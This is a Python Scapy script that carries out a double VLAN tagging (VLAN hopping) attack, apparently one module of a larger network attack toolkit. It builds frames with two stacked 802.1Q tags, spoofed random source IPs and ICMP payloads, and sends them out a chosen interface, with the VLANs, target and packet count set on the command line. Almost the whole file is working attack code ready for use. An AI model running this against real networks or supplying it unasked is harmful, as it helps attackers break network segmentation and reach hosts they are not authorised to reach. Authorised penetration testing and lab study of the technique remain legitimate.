from scapy.all import Ether, Dot1Q, IP, ICMP, sendp, RandIP
import argparse
import random

def execute(args):
    """Execute double VLAN tagging attack"""
    print(f"[Double VLAN] Starting attack on interface {args.interface}")
    
    try:
        outer_vlan = args.outer_vlan if args.outer_vlan else random.randint(1, 4094)
        inner_vlan = args.inner_vlan if args.inner_vlan else random.randint(1, 4094)
        
        target_ip = args.target_ip if args.target_ip else "192.168.1.1"
        target_mac = args.target_mac if args.target_mac else "ff:ff:ff:ff:ff:ff"
        
        print(f"[Double VLAN] Outer VLAN: {outer_vlan}")
        print(f"[Double VLAN] Inner VLAN: {inner_vlan}")
        print(f"[Double VLAN] Target: {target_ip} ({target_mac})")
        
        packets = generate_double_vlan_packets(
            outer_vlan, 
            inner_vlan, 
            target_mac, 
            target_ip,
            args.count if args.count else 100
        )
        
        sendp(packets, iface=args.interface, verbose=args.verbose)
        print(f"[Double VLAN] Sent {len(packets)} double-tagged packets")
        
        return True
        
    except Exception as e:
        print(f"[Double VLAN] Error: {e}")
        return False

def generate_double_vlan_packets(outer_vlan, inner_vlan, target_mac, target_ip, count):
    """Generate double VLAN tagged packets"""
    packets = []
    
    for i in range(count):
        packet = (
            Ether(dst=target_mac) /
            Dot1Q(vlan=outer_vlan) /
            Dot1Q(vlan=inner_vlan) /
            IP(dst=target_ip, src=RandIP()) /
            ICMP() /
            f"Double VLAN Attack - Outer: {outer_vlan}, Inner: {inner_vlan}".encode()
        )
        
        packets.append(packet)
    
    return packets

def add_arguments(parser):
    """Add double VLAN specific arguments to parser"""
    parser.add_argument("--outer-vlan", type=int, help="Outer VLAN ID")
    parser.add_argument("--inner-vlan", type=int, help="Inner VLAN ID")
    parser.add_argument("--target-ip", "-ti", help="Target IP address")
    parser.add_argument("--target-mac", "-tm", help="Target MAC address")
    parser.add_argument("--count", "-c", type=int, default=100, 
                       help="Number of packets to send")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Double VLAN Tagging Attack")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--outer-vlan", type=int, help="Outer VLAN ID")
    parser.add_argument("--inner-vlan", type=int, help="Inner VLAN ID")
    parser.add_argument("--target-ip", "-ti", help="Target IP address")
    parser.add_argument("--target-mac", "-tm", help="Target MAC address")
    parser.add_argument("--count", "-c", type=int, default=100, 
                       help="Number of packets to send")
    
    args = parser.parse_args()
    execute(args)